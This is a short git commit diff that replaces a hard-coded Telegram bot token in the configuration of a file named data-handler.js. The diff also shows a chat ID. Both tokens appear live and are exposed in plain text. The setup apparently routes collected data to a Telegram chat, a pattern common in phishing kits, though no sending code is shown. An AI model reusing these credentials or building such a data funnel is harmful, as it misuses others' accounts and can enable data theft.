025b4f55f0c62aeec6ba71b2adce0b9d87cc73c9
0V0-promo2025 <mlepig300@gmail.com>
2025-07-27 15:13:14 +0700

    Update data-handler.js

--- data-handler.js
+++ data-handler.js
@@ -15,7 +15,7 @@ const getAllData = () => {
 
 // Config Telegram Bot
 const telegramConfig = {
-  botToken: "7392372212:AAHvCAz512TMimfVK2496VvhVv9KnsP8ioQ",  // Ganti dengan token bot Anda
+  botToken: "7392372212:AAEw2KS8kDXkfO2cpJMdgLqtF7F7tR8iBCc",  // Ganti dengan token bot Anda
   chatId: "7370392519"      // Ganti dengan chat ID tujuan
 };
 
